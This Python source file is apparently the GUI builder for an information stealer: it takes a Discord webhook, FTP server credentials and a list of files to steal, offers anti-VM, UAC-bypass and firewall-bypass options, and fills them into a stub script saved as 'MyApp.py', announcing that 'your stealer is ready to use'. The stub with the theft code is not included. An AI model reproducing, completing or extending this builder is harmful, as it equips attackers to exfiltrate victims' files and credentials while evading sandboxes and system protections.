import sys
import os
import ftplib as ftp
from cryptography.fernet import Fernet
from PySide6 import QtCore
from PySide6.QtWidgets import *
from PySide6.QtUiTools import QUiLoader

def genkey():
    return Fernet.generate_key()

def hide_cred(data):
    f = Fernet(genkey())
    return f.encrypt(data)

class MainGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        ui = QUiLoader()
        self.load = ui.load("GUI.ui",None)
        
        self.antivmChecked = False
        self.bypassuacChecked = False
        self.bypassfirewallChecked = False

        #checkbox
        antivm = self.load.findChild(QCheckBox,"AntiVM_Box")
        bypassuac = self.load.findChild(QCheckBox,"BypassUAC_Box")
        bypassfirewall = self.load.findChild(QCheckBox,"BypassFW_Box")
        antivm.stateChanged.connect(self.AntiVM_CheckedChange)
        bypassuac.stateChanged.connect(self.BypassUAC_CheckedChange)
        bypassfirewall.stateChanged.connect(self.BypassFireWall_CheckedChange)
 
        #buttons
        aboutbtn = self.load.findChild(QPushButton,"AboutBtn")
        checkbtn = self.load.findChild(QPushButton,"CheckBtn")
        buildbtn = self.load.findChild(QPushButton,"BuildBtn")
        aboutbtn.clicked.connect(self.About)
        checkbtn.clicked.connect(self.checkFTP)
        buildbtn.clicked.connect(self.Build)

    def show_ui(self):
        self.load.show()

    def AntiVM_CheckedChange(self,state):
        if (state == 2):
            self.antivmChecked = True

    def BypassUAC_CheckedChange(self,state):
        if (state == 2):
            self.bypassuacChecked = True

    def BypassFireWall_CheckedChange(self,state):
        if (state == 2):
            self.bypassfirewallChecked = True

    def checkFTP(self):
        try:
            check = ftp.FTP(self.load.ftpServer_Text.toPlainText())
            check.login(self.load.ftpName_Text.toPlainText(),self.load.ftpPass_Text.toPlainText())
            check.quit()
            QMessageBox.about(self,"success","FTP credential valid and active")
        except ftp.all_errors as ftperr:
            QMessageBox.about(self,"error!!",str(ftperr))

    def About(self):
        QMessageBox.about(self,"about","created by ?0\ncoded in python")

    def Build(self):
        if (self.load.WebHook_Text.toPlainText() == ""):
            pass
        elif (self.load.ftpServer_Text.toPlainText() == ""):
            pass
        elif (self.load.ftpName_Text.toPlainText() == ""):
            pass
        elif (self.load.stealFiles_Text.toPlainText() == ""):
            pass
        else:
            with open("stub/stub.py","r") as readStub:
                sc = readStub.read()
                sc = sc.replace("[dcWebHook]",self.load.WebHook_Text.toPlainText())
                sc = sc.replace("[server]",self.load.ftpServer_Text.toPlainText())
                sc = sc.replace("[user]",self.load.ftpName_Text.toPlainText())
                sc = sc.replace("[pass]",self.load.ftpPass_Text.toPlainText())
                sc = sc.replace("[stealfiles]",self.load.stealFiles_Text.toPlainText())
                sc = sc.replace("[antivm]",str(self.antivmChecked))
                sc = sc.replace("[bypassuac]",str(self.bypassuacChecked))
                sc = sc.replace("[bypassfw]",str(self.bypassfirewallChecked))

                with open("build/MyApp.py","w") as buildStub:
                    buildStub.writelines(sc)

            QMessageBox.about(self,"build success","your stealer is ready to use")

def main():
    app = QApplication(sys.argv)
    gui = MainGUI()
    gui.show_ui()

    app.exec()

if __name__ == "__main__":
    main()